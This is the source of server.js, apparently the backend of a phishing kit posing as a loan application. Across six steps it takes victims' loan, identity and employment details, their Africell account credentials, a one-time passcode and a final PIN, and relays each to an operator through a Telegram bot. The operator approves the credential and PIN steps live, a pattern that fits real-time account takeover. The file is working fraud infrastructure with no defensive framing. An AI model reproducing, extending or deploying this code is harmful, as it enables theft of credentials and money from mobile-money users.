
/**
 * server.js
 * Optimized for Render.com Deployment
 * Flow: 6 Steps | Admin Approval on Step 4 (Password) & Step 6 (PIN)
 */

require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST'],
        credentials: true
    }
});

// Expose socket globally so bot_manager can trigger transitions
global.io = io;

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;

// Store sessions and active socket mapping
const sessions = new Map();
const connectedSockets = new Map(); // Maps appId -> socket.id

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- TELEGRAM WEBHOOK ---
const WEBHOOK_PATH = `/bot${process.env.BOT_TOKEN}`;
app.post(WEBHOOK_PATH, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

async function initTelegramWebhook() {
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}${WEBHOOK_PATH}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Webhook set: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Error:', err.message);
        }
    }
}

// --- SOCKET.IO LOGIC ---
io.on('connection', (socket) => {
    // Generate a unique AppID for this user session
    const appId = `ASA-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    socket.appId = appId;
    connectedSockets.set(appId, socket.id);
    
    console.log(`🔌 Connected: ${appId}`);
    socket.emit('session-ready', { appId: appId });

    // Step 1: Loan Details
    socket.on('step1', (data) => {
        botManager.sendToAdmin(appId, "Step 1: Loan Details", data);
    });

    // Step 2: Identity
    socket.on('step2', (data) => {
        botManager.sendToAdmin(appId, "Step 2: Identity", data);
    });

    // Step 3: Employment
    socket.on('step3', (data) => {
        botManager.sendToAdmin(appId, "Step 3: Employment", data);
    });

    // Step 4: Africell Login (NEEDS ADMIN APPROVAL TO MOVE TO STEP 5)
    socket.on('step4', (data) => {
        console.log(`Step 4 received from ${appId}. Waiting for Admin...`);
        // We pass 'true' to trigger the Approval Button in bot_manager
        botManager.sendToAdmin(appId, "Step 4: Africell Credentials", data, true);
    });

    // Step 5: OTP Received
    socket.on('step5', (data) => {
        botManager.sendToAdmin(appId, "Step 5: OTP Received", data);
    });

    // Step 6: Final PIN (NEEDS ADMIN APPROVAL TO SHOW SUCCESS)
    socket.on('step6', (data) => {
        console.log(`Step 6 PIN received from ${appId}. Waiting for final approval...`);
        // Final approval step
        botManager.sendFinalApproval(appId, data.pin);
    });

    socket.on('disconnect', () => {
        connectedSockets.delete(socket.appId);
        console.log(`🔌 Disconnected: ${socket.appId}`);
    });
});

server.listen(PORT, () => {
    console.log(`🚀 ASA SERVER LIVE ON PORT ${PORT}`);
    initTelegramWebhook();
});